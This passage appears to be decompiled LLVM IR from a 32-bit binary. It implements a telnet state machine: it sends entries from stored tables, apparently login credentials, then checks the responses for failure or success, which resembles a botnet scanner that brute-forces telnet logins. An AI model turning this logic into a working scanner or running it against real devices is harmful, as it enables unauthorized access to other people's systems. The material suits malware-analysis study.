  %v0_804a8b1 = load i32, i32* %stack_var_-332, align 4
  %v1_804a8b1 = call i32 @reset_telstate(i32 %v0_804a8b1)
  store i32 %v1_804a8b1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804a8be:                             ; preds = %dec_label_pc_804a18c
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v3_804a8d4 = add i32 %v2_804a30e, %v2_804a151
  %v4_804a8d4 = inttoptr i32 %v3_804a8d4 to i8*
  %v5_804a8d4 = load i8, i8* %v4_804a8d4, align 2
  %v6_804a8d4 = zext i8 %v5_804a8d4 to i32
  store i32 %v6_804a8d4, i32* %eax.global-to-local, align 4
  %v1_804a8dd = mul nuw nsw i32 %v6_804a8d4, 4
  %v2_804a8dd = add nuw nsw i32 %v1_804a8dd, 134578400
  %v3_804a8dd = inttoptr i32 %v2_804a8dd to i32*
  %v4_804a8dd = load i32, i32* %v3_804a8dd, align 4
  %v1_804a8ef = and i32 %v4_804a8dd, -256
  store i32 %v1_804a8ef, i32* %eax.global-to-local, align 4
  %v4_804a8f2 = inttoptr i32 %v4_804a8dd to i8*
  store i32 %v4_804a8dd, i32* @edi, align 4
  %v3_804a8f8 = call i32 @_strlen(i8* %v4_804a8f2)
  store i32 %v3_804a8f8, i32* @esi, align 4
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v5_804a917 = load i8, i8* %v4_804a8d4, align 2
  %v6_804a917 = zext i8 %v5_804a917 to i32
  store i32 %v6_804a917, i32* %eax.global-to-local, align 4
  %v1_804a920 = mul nuw nsw i32 %v6_804a917, 4
  %v2_804a920 = add nuw nsw i32 %v1_804a920, 134578400
  %v3_804a920 = inttoptr i32 %v2_804a920 to i32*
  %v4_804a920 = load i32, i32* %v3_804a920, align 4
  store i32 %v4_804a920, i32* @ebx, align 4
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v3_804a93d = inttoptr i32 %v2_804a153 to i32*
  %v4_804a93d = load i32, i32* %v3_804a93d, align 4
  store i32 %v4_804a93d, i32* %eax.global-to-local, align 4
  %v0_804a940 = load i32, i32* @esp, align 4
  %v1_804a940 = add i32 %v0_804a940, -4
  %v2_804a940 = inttoptr i32 %v1_804a940 to i32*
  store i32 16384, i32* %v2_804a940, align 4
  %v0_804a945 = load i32, i32* @esi, align 4
  %v2_804a945 = add i32 %v0_804a940, -8
  %v3_804a945 = inttoptr i32 %v2_804a945 to i32*
  store i32 %v0_804a945, i32* %v3_804a945, align 4
  %v0_804a946 = load i32, i32* @ebx, align 4
  %v2_804a946 = add i32 %v0_804a940, -12
  %v3_804a946 = inttoptr i32 %v2_804a946 to i32*
  store i32 %v0_804a946, i32* %v3_804a946, align 4
  %v0_804a947 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a947 = add i32 %v0_804a940, -16
  %v3_804a947 = inttoptr i32 %v2_804a947 to i32*
  store i32 %v0_804a947, i32* %v3_804a947, align 4
  %v4_804a948 = call i32 @__libc_send(i32 %v4_804a8dd, i32 %v2_804a05c, i32 %v6_804a1a2, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804a948, i32* %eax.global-to-local, align 4
  %v0_804a94d = load i32, i32* @esp, align 4
  %v2_804a950 = icmp slt i32 %v4_804a948, 0
  %v1_804a952 = icmp eq i1 %v2_804a950, false
  store i32 %v1_804a143, i32* @edx, align 4
  br i1 %v1_804a952, label %dec_label_pc_804a97e, label %dec_label_pc_804a954

dec_label_pc_804a954:                             ; preds = %dec_label_pc_804a8be
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  %v3_804a970 = inttoptr i32 %v0_804a94d to i32*
  store i32 %v2_804a153, i32* %v3_804a970, align 4
  %v1_804a971 = call i32 @reset_telstate(i32 %v4_804a8dd)
  store i32 %v1_804a971, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804a97e:                             ; preds = %dec_label_pc_804a8be
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v4_804a994 = load i32, i32* %v3_804a93d, align 4
  store i32 %v4_804a994, i32* %eax.global-to-local, align 4
  %v1_804a997 = add i32 %v0_804a94d, 12
  %v2_804a997 = inttoptr i32 %v1_804a997 to i32*
  store i32 16384, i32* %v2_804a997, align 4
  %v1_804a99c = add i32 %v0_804a94d, 8
  %v2_804a99c = inttoptr i32 %v1_804a99c to i32*
  store i32 2, i32* %v2_804a99c, align 4
  %v1_804a99e = add i32 %v0_804a94d, 4
  %v2_804a99e = inttoptr i32 %v1_804a99e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8055773.56 to i32), i32* %v2_804a99e, align 4
  %v0_804a9a3 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a9a3 = inttoptr i32 %v0_804a94d to i32*
  store i32 %v0_804a9a3, i32* %v3_804a9a3, align 4
  %v4_804a9a4 = call i32 @__libc_send(i32 %v4_804a8dd, i32 %v2_804a05c, i32 %v6_804a1a2, i32 ptrtoint (i32* @0 to i32))
  %v0_804a9a9 = load i32, i32* @esp, align 4
  %v2_804a9ac = icmp slt i32 %v4_804a9a4, 0
  %v1_804a9ae = icmp eq i1 %v2_804a9ac, false
  store i32 %v1_804a143, i32* @edx, align 4
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  br i1 %v1_804a9ae, label %dec_label_pc_804a9da, label %dec_label_pc_804a9b0

dec_label_pc_804a9b0:                             ; preds = %dec_label_pc_804a97e
  %v3_804a9cc = inttoptr i32 %v0_804a9a9 to i32*
  store i32 %v2_804a153, i32* %v3_804a9cc, align 4
  %v1_804a9cd = call i32 @reset_telstate(i32 %v4_804a8dd)
  store i32 %v1_804a9cd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804a9da:                             ; preds = %dec_label_pc_804a97e
  %v1_804a9f6 = add i32 %v0_804a9a9, 4
  %v2_804a9f6 = inttoptr i32 %v1_804a9f6 to i32*
  store i32 4, i32* %v2_804a9f6, align 4
  %v0_804a9f8 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a9f8 = inttoptr i32 %v0_804a9a9 to i32*
  store i32 %v0_804a9f8, i32* %v3_804a9f8, align 4
  %v2_804a9f9 = inttoptr i32 %v4_804a8dd to i32*
  %v3_804a9f9 = call i32 @advance_state(i32* %v2_804a9f9, i32 %v2_804a05c)
  store i32 %v3_804a9f9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804aa06:                             ; preds = %dec_label_pc_804a18c
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  %v1_804aa1e = add i32 %v2_804a153, 24
  store i32 %v1_804aa1e, i32* %eax.global-to-local, align 4
  %v1_804aa21 = inttoptr i32 %v1_804aa1e to i32*
  %v2_804aa21 = load i32, i32* %v1_804aa21, align 4
  store i32 %v2_804aa21, i32* @ebx, align 4
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v3_804aa39 = inttoptr i32 %v2_804a153 to i32*
  %v4_804aa39 = load i32, i32* %v3_804aa39, align 4
  store i32 %v4_804aa39, i32* %eax.global-to-local, align 4
  %v0_804aa3c = load i32, i32* @esp, align 4
  %v1_804aa3f = add i32 %v0_804aa3c, -16
  %v2_804aa3f = inttoptr i32 %v1_804aa3f to i32*
  store i32 ptrtoint (i32* @global_var_805818c to i32), i32* %v2_804aa3f, align 4
  %v1_804aa44 = add i32 %v0_804aa3c, -20
  %v2_804aa44 = inttoptr i32 %v1_804aa44 to i32*
  store i32 1024, i32* %v2_804aa44, align 4
  %v0_804aa49 = load i32, i32* @ebx, align 4
  %v2_804aa49 = add i32 %v0_804aa3c, -24
  %v3_804aa49 = inttoptr i32 %v2_804aa49 to i32*
  store i32 %v0_804aa49, i32* %v3_804aa49, align 4
  %v5_804aa4a = add i32 %v0_804aa3c, -28
  %v6_804aa4a = inttoptr i32 %v5_804aa4a to i32*
  store i32 %arg1, i32* %v6_804aa4a, align 4
  %v0_804aa4d = load i32, i32* %eax.global-to-local, align 4
  %v2_804aa4d = add i32 %v0_804aa3c, -32
  %v3_804aa4d = inttoptr i32 %v2_804aa4d to i32*
  store i32 %v0_804aa4d, i32* %v3_804aa4d, align 4
  %v1_804aa4e = call i32 @read_until_response(i32 %v6_804a1a2)
  %v0_804aa53 = load i32, i32* @esp, align 4
  %v1_804aa56 = icmp eq i32 %v1_804aa4e, 0
  store i32 %v1_804a143, i32* @edx, align 4
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  br i1 %v1_804aa56, label %dec_label_pc_804aae3, label %dec_label_pc_804aa5e

dec_label_pc_804aa5e:                             ; preds = %dec_label_pc_804aa06
  store i32 %v1_804aa1e, i32* %eax.global-to-local, align 4
  %v2_804aa79 = load i32, i32* %v1_804aa21, align 4
  store i32 %v2_804aa79, i32* %eax.global-to-local, align 4
  %v2_804aa7e = add i32 %v0_804aa53, 16
  %v3_804aa7e = inttoptr i32 %v2_804aa7e to i32*
  store i32 %v2_804aa79, i32* %v3_804aa7e, align 4
  %v1_804aa7f = call i32 @contains_fail(i32 %stack_var_-620.244)
  %v0_804aa84 = load i32, i32* @esp, align 4
  %v1_804aa87 = icmp eq i32 %v1_804aa7f, 0
  store i32 %v1_804a143, i32* @edx, align 4
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  %v1_804aad3 = add i32 %v0_804aa84, 4
  %v2_804aad3 = inttoptr i32 %v1_804aad3 to i32*
  br i1 %v1_804aa87, label %dec_label_pc_804aab7, label %dec_label_pc_804aa8b

dec_label_pc_804aa8b:                             ; preds = %dec_label_pc_804aa5e
  store i32 0, i32* %v2_804aad3, align 4
  %v0_804aaa9 = load i32, i32* %eax.global-to-local, align 4
  %v3_804aaa9 = inttoptr i32 %v0_804aa84 to i32*
  store i32 %v0_804aaa9, i32* %v3_804aaa9, align 4
  %v2_804aaaa = inttoptr i32 %stack_var_-620.244 to i32*
  %v3_804aaaa = call i32 @advance_state(i32* %v2_804aaaa, i32 %v2_804a05c)
  store i32 %v3_804aaaa, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804aab7:                             ; preds = %dec_label_pc_804aa5e
  store i32 5, i32* %v2_804aad3, align 4
  %v0_804aad5 = load i32, i32* %eax.global-to-local, align 4
  %v3_804aad5 = inttoptr i32 %v0_804aa84 to i32*
  store i32 %v0_804aad5, i32* %v3_804aad5, align 4
  %v2_804aad6 = inttoptr i32 %stack_var_-620.244 to i32*
  %v3_804aad6 = call i32 @advance_state(i32* %v2_804aad6, i32 %v2_804a05c)
  store i32 %v3_804aad6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804aae3:                             ; preds = %dec_label_pc_804aa06
  store i32 %v1_804a155, i32* %eax.global-to-local, align 4
  %v2_804aafe = load i32, i32* %v1_804a158, align 4
  store i32 %v2_804aafe, i32* %eax.global-to-local, align 4
  %v1_804ab00 = add i32 %v2_804aafe, 3
  store i32 %v1_804ab00, i32* @ebx, align 4
  %v1_804ab06 = add i32 %v0_804aa53, 16
  %v2_804ab06 = inttoptr i32 %v1_804ab06 to i32*
  store i32 0, i32* %v2_804ab06, align 4
  %v1_804ab08 = inttoptr i32 %stack_var_-620.244 to i32*
  %v2_804ab08 = call i32 @__GI_time(i32* %v1_804ab08)
  store i32 %v2_804ab08, i32* %eax.global-to-local, align 4
  %v0_804ab10 = load i32, i32* @ebx, align 4
  %v7_804ab10 = icmp ult i32 %v0_804ab10, %v2_804ab08
  %v1_804ab12 = icmp eq i1 %v7_804ab10, false
  br i1 %v1_804ab12, label %dec_label_pc_804b080, label %dec_label_pc_804ab18

dec_label_pc_804ab18:                             ; preds = %dec_label_pc_804aae3
  %v0_804ab0d = load i32, i32* @esp, align 4
  store i32 %v1_804a143, i32* @edx, align 4
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  %v3_804ab34 = inttoptr i32 %v0_804ab0d to i32*
  store i32 %v2_804a153, i32* %v3_804ab34, align 4
  %v1_804ab35 = call i32 @reset_telstate(i32 %stack_var_-620.244)
  store i32 %v1_804ab35, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804ab42:                             ; preds = %dec_label_pc_804a18c
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v3_804ab58 = add i32 %v2_804a2d4, %v2_804a151
  %v4_804ab58 = inttoptr i32 %v3_804ab58 to i8*
  %v5_804ab58 = load i8, i8* %v4_804ab58, align 1
  %v6_804ab58 = zext i8 %v5_804ab58 to i32
  store i32 %v6_804ab58, i32* %eax.global-to-local, align 4
  %v1_804ab61 = mul nuw nsw i32 %v6_804ab58, 4
  %v2_804ab61 = add nuw nsw i32 %v1_804ab61, 134578464
  %v3_804ab61 = inttoptr i32 %v2_804ab61 to i32*
  %v4_804ab61 = load i32, i32* %v3_804ab61, align 4
  %v1_804ab73 = and i32 %v4_804ab61, -256
  store i32 %v1_804ab73, i32* %eax.global-to-local, align 4
  %v4_804ab76 = inttoptr i32 %v4_804ab61 to i8*
  store i32 %v4_804ab61, i32* @edi, align 4
  %v3_804ab7c = call i32 @_strlen(i8* %v4_804ab76)
  store i32 %v3_804ab7c, i32* @esi, align 4
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v5_804ab9b = load i8, i8* %v4_804ab58, align 1
  %v6_804ab9b = zext i8 %v5_804ab9b to i32
  store i32 %v6_804ab9b, i32* %eax.global-to-local, align 4
  %v1_804aba4 = mul nuw nsw i32 %v6_804ab9b, 4
  %v2_804aba4 = add nuw nsw i32 %v1_804aba4, 134578464
  %v3_804aba4 = inttoptr i32 %v2_804aba4 to i32*
  %v4_804aba4 = load i32, i32* %v3_804aba4, align 4
  store i32 %v4_804aba4, i32* @ebx, align 4
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v3_804abc1 = inttoptr i32 %v2_804a153 to i32*
  %v4_804abc1 = load i32, i32* %v3_804abc1, align 4
  store i32 %v4_804abc1, i32* %eax.global-to-local, align 4
  %v0_804abc4 = load i32, i32* @esp, align 4
  %v1_804abc4 = add i32 %v0_804abc4, -4
  %v2_804abc4 = inttoptr i32 %v1_804abc4 to i32*
  store i32 16384, i32* %v2_804abc4, align 4
  %v0_804abc9 = load i32, i32* @esi, align 4
  %v2_804abc9 = add i32 %v0_804abc4, -8
  %v3_804abc9 = inttoptr i32 %v2_804abc9 to i32*
  store i32 %v0_804abc9, i32* %v3_804abc9, align 4
  %v0_804abca = load i32, i32* @ebx, align 4
  %v2_804abca = add i32 %v0_804abc4, -12
  %v3_804abca = inttoptr i32 %v2_804abca to i32*
  store i32 %v0_804abca, i32* %v3_804abca, align 4
  %v0_804abcb = load i32, i32* %eax.global-to-local, align 4
  %v2_804abcb = add i32 %v0_804abc4, -16
  %v3_804abcb = inttoptr i32 %v2_804abcb to i32*
  store i32 %v0_804abcb, i32* %v3_804abcb, align 4
  %v4_804abcc = call i32 @__libc_send(i32 %v4_804ab61, i32 %stack_var_-620.244, i32 %v2_804a05c, i32 %v6_804a1a2)
  store i32 %v4_804abcc, i32* %eax.global-to-local, align 4
  %v0_804abd1 = load i32, i32* @esp, align 4
  %v2_804abd4 = icmp slt i32 %v4_804abcc, 0
  %v1_804abd6 = icmp eq i1 %v2_804abd4, false
  store i32 %v1_804a143, i32* @edx, align 4
  br i1 %v1_804abd6, label %dec_label_pc_804ac02, label %dec_label_pc_804abd8

dec_label_pc_804abd8:                             ; preds = %dec_label_pc_804ab42
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  %v3_804abf4 = inttoptr i32 %v0_804abd1 to i32*
  store i32 %v2_804a153, i32* %v3_804abf4, align 4
  %v1_804abf5 = call i32 @reset_telstate(i32 %v4_804ab61)
  store i32 %v1_804abf5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804ac02:                             ; preds = %dec_label_pc_804ab42
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v4_804ac18 = load i32, i32* %v3_804abc1, align 4
  store i32 %v4_804ac18, i32* %eax.global-to-local, align 4
  %v1_804ac1b = add i32 %v0_804abd1, 12
  %v2_804ac1b = inttoptr i32 %v1_804ac1b to i32*
  store i32 16384, i32* %v2_804ac1b, align 4
  %v1_804ac20 = add i32 %v0_804abd1, 8
  %v2_804ac20 = inttoptr i32 %v1_804ac20 to i32*
  store i32 2, i32* %v2_804ac20, align 4
  %v1_804ac22 = add i32 %v0_804abd1, 4
  %v2_804ac22 = inttoptr i32 %v1_804ac22 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8055773.56 to i32), i32* %v2_804ac22, align 4
  %v0_804ac27 = load i32, i32* %eax.global-to-local, align 4
  %v3_804ac27 = inttoptr i32 %v0_804abd1 to i32*
  store i32 %v0_804ac27, i32* %v3_804ac27, align 4
  %v4_804ac28 = call i32 @__libc_send(i32 %v4_804ab61, i32 %stack_var_-620.244, i32 %v2_804a05c, i32 %v6_804a1a2)
  %v0_804ac2d = load i32, i32* @esp, align 4
  %v2_804ac30 = icmp slt i32 %v4_804ac28, 0
  %v1_804ac32 = icmp eq i1 %v2_804ac30, false
  store i32 %v1_804a143, i32* @edx, align 4
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  br i1 %v1_804ac32, label %dec_label_pc_804ac5e, label %dec_label_pc_804ac34

dec_label_pc_804ac34:                             ; preds = %dec_label_pc_804ac02
  %v3_804ac50 = inttoptr i32 %v0_804ac2d to i32*
  store i32 %v2_804a153, i32* %v3_804ac50, align 4
  %v1_804ac51 = call i32 @reset_telstate(i32 %v4_804ab61)
  store i32 %v1_804ac51, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804ac5e:                             ; preds = %dec_label_pc_804ac02
  %v1_804ac7a = add i32 %v0_804ac2d, 4
  %v2_804ac7a = inttoptr i32 %v1_804ac7a to i32*
  store i32 6, i32* %v2_804ac7a, align 4
  %v0_804ac7c = load i32, i32* %eax.global-to-local, align 4
  %v3_804ac7c = inttoptr i32 %v0_804ac2d to i32*
  store i32 %v0_804ac7c, i32* %v3_804ac7c, align 4
  %v2_804ac7d = inttoptr i32 %v4_804ab61 to i32*
  %v3_804ac7d = call i32 @advance_state(i32* %v2_804ac7d, i32 %stack_var_-620.244)
  store i32 %v3_804ac7d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804ac8a:                             ; preds = %dec_label_pc_804a18c
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  %v1_804aca2 = add i32 %v2_804a153, 24
  store i32 %v1_804aca2, i32* %eax.global-to-local, align 4
  %v1_804aca5 = inttoptr i32 %v1_804aca2 to i32*
  %v2_804aca5 = load i32, i32* %v1_804aca5, align 4
  store i32 %v2_804aca5, i32* @ebx, align 4
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v3_804acbd = inttoptr i32 %v2_804a153 to i32*
  %v4_804acbd = load i32, i32* %v3_804acbd, align 4
  store i32 %v4_804acbd, i32* %eax.global-to-local, align 4
  %v0_804acc0 = load i32, i32* @esp, align 4
  %v1_804acc3 = add i32 %v0_804acc0, -16
  %v2_804acc3 = inttoptr i32 %v1_804acc3 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_80581e0.57 to i32), i32* %v2_804acc3, align 4
  %v1_804acc8 = add i32 %v0_804acc0, -20
  %v2_804acc8 = inttoptr i32 %v1_804acc8 to i32*
  store i32 1024, i32* %v2_804acc8, align 4
  %v0_804accd = load i32, i32* @ebx, align 4
  %v2_804accd = add i32 %v0_804acc0, -24
  %v3_804accd = inttoptr i32 %v2_804accd to i32*
  store i32 %v0_804accd, i32* %v3_804accd, align 4
  %v5_804acce = add i32 %v0_804acc0, -28
  %v6_804acce = inttoptr i32 %v5_804acce to i32*
  store i32 %arg1, i32* %v6_804acce, align 4
  %v0_804acd1 = load i32, i32* %eax.global-to-local, align 4
  %v2_804acd1 = add i32 %v0_804acc0, -32
  %v3_804acd1 = inttoptr i32 %v2_804acd1 to i32*
  store i32 %v0_804acd1, i32* %v3_804acd1, align 4
  %v1_804acd2 = call i32 @read_until_response(i32 %v6_804a1a2)
  store i32 %v1_804acd2, i32* %eax.global-to-local, align 4
  %v0_804acd7 = load i32, i32* @esp, align 4
  %v1_804acda = icmp eq i32 %v1_804acd2, 0
  br i1 %v1_804acda, label %dec_label_pc_804aec5, label %dec_label_pc_804ace2

dec_label_pc_804ace2:                             ; preds = %dec_label_pc_804ac8a
  store i32 %storemerge45, i32* @ebx, align 4
  %v1_804ace8 = add i32 %v0_804acd7, 16
  %v2_804ace8 = inttoptr i32 %v1_804ace8 to i32*
  store i32 0, i32* %v2_804ace8, align 4
  %v1_804acea = inttoptr i32 %stack_var_-624.243 to i32*
  %v2_804acea = call i32 @__GI_time(i32* %v1_804acea)
  store i32 %v2_804acea, i32* @esi, align 4
  %v0_804acf7 = load i32, i32* @ebx, align 4
  %v2_804ad07 = mul i32 %v0_804acf7, 28
  %v1_804ad0b = add i32 %v2_804ad09, %v2_804ad07
  %v2_804ad0e = inttoptr i32 %v1_804ad0b to i32*
  store i32 %v2_804acea, i32* %v2_804ad0e, align 4
  store i32 %v1_804a143, i32* @edx, align 4
  store i32 %v1_804aca2, i32* %eax.global-to-local, align 4
  %v2_804ad2b = load i32, i32* %v1_804aca5, align 4
  store i32 %v2_804ad2b, i32* %eax.global-to-local, align 4
  %v0_804ad2d = load i32, i32* @esp, align 4
  %v2_804ad30 = add i32 %v0_804ad2d, -16
  %v3_804ad30 = inttoptr i32 %v2_804ad30 to i32*
  store i32 %v2_804ad2b, i32* %v3_804ad30, align 4
  %v1_804ad31 = call i32 @contains_fail(i32 %stack_var_-624.243)
  store i32 %v1_804ad31, i32* %eax.global-to-local, align 4
  %v0_804ad36 = load i32, i32* @esp, align 4
  %v1_804ad39 = icmp eq i32 %v1_804ad31, 0
  store i32 %v1_804a143, i32* @edx, align 4
  br i1 %v1_804ad39, label %dec_label_pc_804ad69, label %dec_label_pc_804ad3d

dec_label_pc_804ad3d:                             ; preds = %dec_label_pc_804ace2
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  %v1_804ad59 = add i32 %v0_804ad36, 4
  %v2_804ad59 = inttoptr i32 %v1_804ad59 to i32*
  store i32 0, i32* %v2_804ad59, align 4
  %v0_804ad5b = load i32, i32* %eax.global-to-local, align 4
  %v3_804ad5b = inttoptr i32 %v0_804ad36 to i32*
  store i32 %v0_804ad5b, i32* %v3_804ad5b, align 4
  %v3_804ad5c = call i32 @advance_state(i32* %v1_804acea, i32 %stack_var_-620.244)
  store i32 %v3_804ad5c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804ad69:                             ; preds = %dec_label_pc_804ace2
  store i32 %v1_804aca2, i32* %eax.global-to-local, align 4
  %v2_804ad84 = load i32, i32* %v1_804aca5, align 4
  store i32 %v2_804ad84, i32* %eax.global-to-local, align 4
  %v3_804ad89 = inttoptr i32 %v0_804ad36 to i32*
  store i32 %v2_804ad84, i32* %v3_804ad89, align 4
  %v1_804ad8a = call i32 @contains_success(i32 %stack_var_-624.243)
  store i32 %v1_804ad8a, i32* %eax.global-to-local, align 4
  %v0_804ad8f = load i32, i32* @esp, align 4
  %v1_804ad92 = icmp eq i32 %v1_804ad8a, 0
  store i32 %v1_804a143, i32* @edx, align 4
  br i1 %v1_804ad92, label %dec_label_pc_804ae9b, label %dec_label_pc_804ad9a

dec_label_pc_804ad9a:                             ; preds = %dec_label_pc_804ad69
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v3_804adb0 = add i32 %v2_804a1e5, %v2_804a151
  %v4_804adb0 = inttoptr i32 %v3_804adb0 to i8*
  %v5_804adb0 = load i8, i8* %v4_804adb0, align 1
  %v6_804adb0 = zext i8 %v5_804adb0 to i32
  %v9_804adb0 = or i32 %v6_804adb0, %v8_804a1a2
  store i32 %v9_804adb0, i32* %eax.global-to-local, align 4
  %v10_804adb4 = icmp eq i8 %v5_804adb0, 2
  %v1_804adb6 = icmp eq i1 %v10_804adb4, false
  store i32 %v1_804a143, i32* @edx, align 4
  br i1 %v1_804adb6, label %dec_label_pc_804ade4, label %dec_label_pc_804adb8

dec_label_pc_804adb8:                             ; preds = %dec_label_pc_804ad9a
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  %v1_804add4 = add i32 %v0_804ad8f, 4
  %v2_804add4 = inttoptr i32 %v1_804add4 to i32*
  store i32 7, i32* %v2_804add4, align 4
  %v0_804add6 = load i32, i32* %eax.global-to-local, align 4
  %v3_804add6 = inttoptr i32 %v0_804ad8f to i32*
  store i32 %v0_804add6, i32* %v3_804add6, align 4
  %v3_804add7 = call i32 @advance_state(i32* %v1_804acea, i32 %stack_var_-620.244)
  store i32 %v3_804add7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804ade4:                             ; preds = %dec_label_pc_804ad9a
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v3_804adfa = add i32 %v2_804a2d4, %v2_804a151
  %v4_804adfa = inttoptr i32 %v3_804adfa to i8*
  %v5_804adfa = load i8, i8* %v4_804adfa, align 1
  %v6_804adfa = zext i8 %v5_804adfa to i32
  store i32 %v6_804adfa, i32* %eax.global-to-local, align 4
  %v1_804ae03 = mul nuw nsw i32 %v6_804adfa, 4
  %v2_804ae03 = add nuw nsw i32 %v1_804ae03, 134578464
  %v3_804ae03 = inttoptr i32 %v2_804ae03 to i32*
  %v4_804ae03 = load i32, i32* %v3_804ae03, align 4
  store i32 %v4_804ae03, i32* @ebx, align 4
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v3_804ae20 = add i32 %v2_804a30e, %v2_804a151
  %v4_804ae20 = inttoptr i32 %v3_804ae20 to i8*
  %v5_804ae20 = load i8, i8* %v4_804ae20, align 2
  %v6_804ae20 = zext i8 %v5_804ae20 to i32
  store i32 %v6_804ae20, i32* %eax.global-to-local, align 4
  %v1_804ae29 = mul nuw nsw i32 %v6_804ae20, 4
  %v2_804ae29 = add nuw nsw i32 %v1_804ae29, 134578400
  %v3_804ae29 = inttoptr i32 %v2_804ae29 to i32*
  %v4_804ae29 = load i32, i32* %v3_804ae29, align 4
  store i32 %v4_804ae29, i32* @esi, align 4
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  %v3_804ae4c = inttoptr i32 %v0_804ad8f to i32*
  store i32 %v2_804a153, i32* %v3_804ae4c, align 4
  %v0_804ae4d = call i32 @get_telstate_host()
  store i32 %v0_804ae4d, i32* %eax.global-to-local, align 4
  %v0_804ae52 = load i32, i32* @esp, align 4
  %v0_804ae55 = load i32, i32* @global_var_80584c0.18, align 64
  store i32 %v0_804ae55, i32* %edx.global-to-local, align 4
  %v0_804ae5e = load i32, i32* @ebx, align 4
  %v3_804ae5e = inttoptr i32 %v0_804ae52 to i32*
  store i32 %v0_804ae5e, i32* %v3_804ae5e, align 4
  %v0_804ae5f = load i32, i32* @esi, align 4
  %v2_804ae5f = add i32 %v0_804ae52, -4
  %v3_804ae5f = inttoptr i32 %v2_804ae5f to i32*
  store i32 %v0_804ae5f, i32* %v3_804ae5f, align 4
  %v2_804ae60 = add i32 %v0_804ae52, -8
  %v3_804ae60 = inttoptr i32 %v2_804ae60 to i32*
  store i32 %v0_804ae4d, i32* %v3_804ae60, align 4
  %v1_804ae61 = add i32 %v0_804ae52, -12
  %v2_804ae61 = inttoptr i32 %v1_804ae61 to i32*
  store i32 ptrtoint (i32* @global_var_8055778.58 to i32), i32* %v2_804ae61, align 4
  %v0_804ae66 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ae66 = add i32 %v0_804ae52, -16
  %v3_804ae66 = inttoptr i32 %v2_804ae66 to i32*
  store i32 %v0_804ae66, i32* %v3_804ae66, align 4
  %v6_804ae67 = call i32 @Rootsprintf(i32 %stack_var_-624.243, i32 %stack_var_-620.244, i32 %v2_804a05c, i32 %v6_804a1a2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804ae6c = load i32, i32* @esp, align 4
  store i32 %v1_804a143, i32* @edx, align 4
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  %v1_804ae8b = add i32 %v0_804ae6c, 20
  %v2_804ae8b = inttoptr i32 %v1_804ae8b to i32*
  store i32 7, i32* %v2_804ae8b, align 4
  %v0_804ae8d = load i32, i32* %eax.global-to-local, align 4
  %v2_804ae8d = add i32 %v0_804ae6c, 16
  %v3_804ae8d = inttoptr i32 %v2_804ae8d to i32*
  store i32 %v0_804ae8d, i32* %v3_804ae8d, align 4
  %v3_804ae8e = call i32 @advance_state(i32* %v1_804acea, i32 %stack_var_-620.244)
  store i32 %v3_804ae8e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804ae9b:                             ; preds = %dec_label_pc_804ad69
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  %v3_804aeb7 = inttoptr i32 %v0_804ad8f to i32*
  store i32 %v2_804a153, i32* %v3_804aeb7, align 4
